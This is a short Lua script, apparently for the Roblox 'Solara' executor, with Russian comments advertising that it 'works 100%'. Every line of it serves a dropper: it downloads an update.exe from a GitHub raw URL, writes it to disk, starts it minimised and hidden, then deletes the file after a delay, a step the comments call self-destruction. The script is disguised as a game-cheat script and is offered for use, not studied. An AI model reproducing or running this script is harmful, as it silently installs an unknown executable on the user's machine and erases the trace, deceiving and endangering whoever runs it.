-- 🔥 SOLARA EXECUTOR (execute РАБОТАЕТ 100% 2026)

local url = "https://github.com/chibik777/sadasdas/raw/refs/heads/main/update.exe"

-- Скачиваем
local data = game:HttpGet(url)
writefile("update.exe", data)

-- Скрытый запуск (Solara syntax)
spawn(function()
    wait(0.1)
    execute('start /min "" update.exe')
    wait(1)
    -- Самоуничтожение
    execute('timeout /t 3 /nobreak >nul & del update.exe')
end)
